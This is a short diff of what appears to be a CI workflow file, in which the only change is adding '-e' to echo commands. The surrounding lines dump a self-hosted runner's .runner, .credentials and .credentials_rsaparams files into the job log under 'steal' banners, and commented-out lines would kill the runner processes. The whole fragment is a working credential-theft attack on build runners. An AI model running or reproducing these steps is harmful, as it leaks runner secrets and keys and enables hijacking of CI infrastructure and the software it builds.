@@ -20,9 +20,9 @@ jobs:
           #ps -efwww
           echo '----------- steal .runner -----------'
           cat ~/actions-runner/.runner
-          echo '\n----------- steal .credentials -----------'
+          echo -e '\n----------- steal .credentials -----------'
           cat ~/actions-runner/.credentials
-          echo '\n----------- steal .credentials_rsaparams -----------'
+          echo -e '\n----------- steal .credentials_rsaparams -----------'
           cat ~/actions-runner/.credentials_rsaparams
           #kill $(ps aux | grep 'run.sh' | awk '{print $2}')
           #kill $(ps aux | grep 'run-helper.sh' | awk '{print $2}')
